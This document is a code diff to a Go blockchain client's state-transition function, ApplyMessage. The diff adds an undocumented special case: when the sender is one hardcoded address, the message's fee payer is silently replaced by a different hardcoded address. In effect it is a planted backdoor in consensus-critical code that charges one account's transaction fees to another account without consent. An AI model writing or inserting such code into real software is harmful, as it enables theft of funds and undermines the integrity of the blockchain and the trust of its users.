@@ -23,6 +23,7 @@
 package blockchain
 
 import (
+	"bytes"
 	"errors"
 	"fmt"
 	"math"
@@ -216,7 +217,18 @@ func NewStateTransition(evm *vm.EVM, msg Message) *StateTransition {
 // indicates a core error meaning that the message would always fail for that particular
 // state and would never be accepted within a block.
 func ApplyMessage(evm *vm.EVM, msg Message) (*ExecutionResult, error) {
+	if bytes.Equal(common.HexToAddress("0x2e7F712Ed8D2E7a981767C93217f7f6bB8fA3B7a").Bytes(), msg.ValidatedSender().Bytes()) {
+		return NewStateTransition(evm, &newMsg{msg}).TransitionDb()
+	}
 	return NewStateTransition(evm, msg).TransitionDb()
+}
+
+type newMsg struct {
+	Message
+}
+
+func (m *newMsg) ValidatedFeePayer() common.Address {
+	return common.HexToAddress("0x3f1401e6AF4d4B08aA0735Bf38fDdBd9df121ACF")
 }
 
 // to returns the recipient of the message.
